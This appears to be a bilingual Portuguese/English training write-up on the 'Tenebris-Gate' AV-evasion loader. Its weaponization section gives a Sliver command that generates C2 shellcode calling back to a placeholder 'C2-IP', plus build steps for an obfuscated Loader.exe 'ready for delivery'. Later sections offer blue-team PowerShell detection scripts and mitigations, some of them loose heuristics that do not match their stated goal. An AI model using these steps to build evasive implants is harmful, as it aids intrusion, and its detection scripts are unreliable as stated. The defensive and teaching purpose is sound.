3. O que é Tenebris-Gate Original

O Tenebris-Gate é um framework de evasão multicamada desenhado para proteger e executar shellcode raw de forma a evitar deteção. Processa um payload .bin através de uma cadeia de proteções, onde cada camada visa um tipo diferente de análise. Começa por comprimir e encriptar o payload para remover padrões reconhecíveis e esconder o conteúdo de scanners estáticos. A chave de encriptação é disfarçada usando HellShell IPv4 encoding, tornando a extração mais difícil. A partir daí, o framework introduz verificações anti-debug e atrasa a execução usando cálculos de números primos para interferir com a análise de sandbox. Tenebris-Gate is a multi-layered evasion framework designed to protect and execute raw shellcode in a way that avoids detection. It processes a .bin payload through a chain of protections, where each layer targets a different type of analysis. It starts by compressing and encrypting the payload to remove recognizable patterns and hide its contents from static scanners. The encryption key itself is disguised using HellShell IPv4 encoding, making extraction more difficult. From there, the framework introduces anti-debugging checks and delays execution using prime number calculations to interfere with sandbox analysis.
Para se misturar com a atividade normal do sistema, o Tenebris-Gate mascara o processo como explorer.exe e evita imports suspeitos resolvendo APIs através de Djb2 hashing. A um nível mais profundo, contorna hooks de segurança em userland usando syscalls adulteradas e gere a memória cuidadosamente para evitar flags RWX. To blend in with normal system activity, Tenebris-Gate masks the process as explorer.exe and avoids suspicious imports by resolving APIs through Djb2 hashing. At a deeper level, it bypasses userland security hooks using tampered syscalls and manages memory carefully to avoid RWX flags.

5. Weaponization e Encriptação Original

Com os pré-requisitos satisfeitos, o primeiro passo é gerar um payload de shellcode raw. Isto pode ser feito com qualquer framework de C2, mas usamos o Sliver para consistência. Dentro do Sliver: With the prerequisites in place, the first step is to generate a raw shellcode payload. This can be done using any C2 framework, but we use Sliver for consistency. Within Sliver: 
sliver > generate –http C2-IP –skip-symbols –os windows –format shellcode –save /home/kali/
Isto produz um ficheiro de shellcode que será processado pelo Tenebris-Gate. Transfere o ficheiro .bin para a máquina Windows onde o framework está descarregado. Abre o Developer PowerShell for Visual Studio, navega até ao diretório do Tenebris-Gate e compila o projeto: This produces a shellcode file that will be processed by Tenebris-Gate. Transfer the .bin file to the Windows machine where the framework is downloaded. Open the Developer PowerShell for Visual Studio, navigate to the Tenebris-Gate directory, and build the project: 
PS > msbuild SilentForge.sln /p:Configuration=Release /p:Platform=x64
Após compilar, encripta o payload com a ferramenta fornecida: After building, encrypt the payload with the provided tool: 
PS > .\Build\Release\PayloadCrypt.exe .\MANUAL_MANUFACTURER.bin Loader\
Este passo aplica o pipeline completo de evasão ao shellcode. Quando a encriptação terminar, reconstroi o loader para embutir o payload encriptado: This step applies the full evasion pipeline to your shellcode. Once encryption is complete, rebuild the loader so it embeds the encrypted payload: 
PS > msbuild SilentForge.sln /p:Configuration=Release /p:Platform=x64 /t:Loader
Quando o processo terminar, o executável final estará disponível em Build\Release como Loader.exe. Este ficheiro contém o payload totalmente ofuscado e protegido, pronto para entrega. When this process finishes, your final executable will be available in Build\Release as Loader.exe. This file contains the fully obfuscated and protected payload, ready for delivery.

7. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo ajudam o blue team a detetar atividade compatível com o Tenebris-Gate e outras técnicas de evasão similares. The scripts below help the blue team detect activity consistent with Tenebris-Gate and similar evasion techniques.

7.1 Script 12.1 — Deteção de Processo Mascarado como explorer.exe / Masqueraded explorer.exe Detection

Objetivo: detetar processos que se mascaram como explorer.exe mas não são o binário legítimo em C:\Windows\explorer.exe. Evidência: masquerade-detect.csv. Goal: detect processes masquerading as explorer.exe but not the legitimate binary in C:\Windows\explorer.exe. Evidence: masquerade-detect.csv. 
# Script 12.1 - Masqueraded explorer.exe Detection
$out = ".\masquerade-detect.csv"
$legit = "C:\Windows\explorer.exe"
$hits = @()
Get-Process explorer -EA SilentlyContinue | ForEach-Object {
  $path = $_.Path
  if ($path -and $path -ne $legit) {
    $hits += [PSCustomObject]@{ PID=$_.Id; Path=$path; StartTime=$_.StartTime }
  }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Masqueraded explorer processes: $($hits.Count) -> $out" -ForegroundColor Red

7.2 Script 12.2 — Deteção de API Hashing (Djb2) / API Hashing Detection

Objetivo: detetar chamadas a GetProcAddress com argumentos que não são strings (indicador de API hashing) via Sysmon Event 7 (Image Loaded) ou ETW. Evidência: api-hash-detect.csv. Goal: detect GetProcAddress calls with non-string arguments (API hashing indicator) via Sysmon Event 7 (Image Loaded) or ETW. Evidence: api-hash-detect.csv. 
# Script 12.2 - API Hashing Detection (heuristic via Sysmon)
$out = ".\api-hash-detect.csv"
$hits = @()
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 1000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 7 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $img = ($xml.Event.EventData.Data | Where-Object Name -eq "ImageLoaded").'#text'
    if ($img -match "kernel32|ntdll") {
      # Baseline: flag unusual image loads from non-standard paths
      if ($img -notmatch "C:\\Windows\\System32") {
        $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Image=$img }
      }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Suspicious image loads: $($hits.Count) -> $out" -ForegroundColor Yellow

7.3 Script 12.3 — Deteção de Syscalls Diretas / Direct Syscall Detection

Objetivo: usar ETW Threat Intelligence (se disponível) para detetar instruções syscall originadas fora de ntdll.dll. Evidência: syscall-detect.csv. Goal: use ETW Threat Intelligence (if available) to detect syscall instructions originating outside ntdll.dll. Evidence: syscall-detect.csv. 
# Script 12.3 - Direct Syscall Detection (ETW TI provider)
$out = ".\syscall-detect.csv"
$hits = @()
# Note: Requires Microsoft-Windows-Threat-Intelligence provider enabled
Get-WinEvent -LogName "Microsoft-Windows-Threat-Intelligence/Analytic" -MaxEvents 500 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 8 } | ForEach-Object {
    $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Message=$_.Message }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Syscall events: $($hits.Count) -> $out" -ForegroundColor Red

7.4 Script 12.4 — Verificação de Memória Executável Fora de Módulos / Non-Module Executable Memory

Objetivo: detetar regiões de memória com permissões executáveis que não pertencem a módulos legítimos (indicador de shellcode carregado). Evidência: nonmodule-exec.csv. Goal: detect executable memory regions not belonging to legitimate modules (shellcode loading indicator). Evidence: nonmodule-exec.csv. 
# Script 12.4 - Non-Module Executable Memory Check (requires admin)
$out = ".\nonmodule-exec.csv"
$hits = @()
# Use Get-Process + module enumeration (simplified heuristic)
Get-Process | ForEach-Object {
  $p = $_
  try {
    $mods = $p.Modules | ForEach-Object { $_.BaseAddress }
    # Flag processes with very few modules but high memory (heuristic)
    if ($mods.Count -lt 5 -and $p.WorkingSet64 -gt 50MB) {
      $hits += [PSCustomObject]@{ PID=$p.Id; Name=$p.ProcessName; Modules=$mods.Count; WorkingSetMB=[math]::Round($p.WorkingSet64/1MB,2) }
    }
  } catch {}
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Suspicious processes: $($hits.Count) -> $out" -ForegroundColor Yellow

9. Mitigações Blue Team / Mitigations Complementar

  1. Monitorizar processos mascarados — verificar Path de explorer.exe (Script 12.1).
  2. Ativar ETW Threat Intelligence — deteta syscalls diretas (Script 12.3).
  3. Sysmon Event 7 e 10 — monitorizar image loads e process access.
  4. Control Flow Guard (CFG) + Arbitrary Code Guard (ACG) — via WDAC, bloqueia execução de shellcode.
  5. AMSI + Script Block Logging — deteta payloads PowerShell (se aplicável).
  6. Monitorizar memória executável fora de módulos — heurística do Script 12.4.
  7. Desativar macros e execução de binários não assinados — AppLocker/WDAC.
  8. Honeytokens — processos falsos com nomes legítimos.
  9. Threat hunting regular — o ciclo de vida destas ferramentas é curto; manter regras atualizadas.
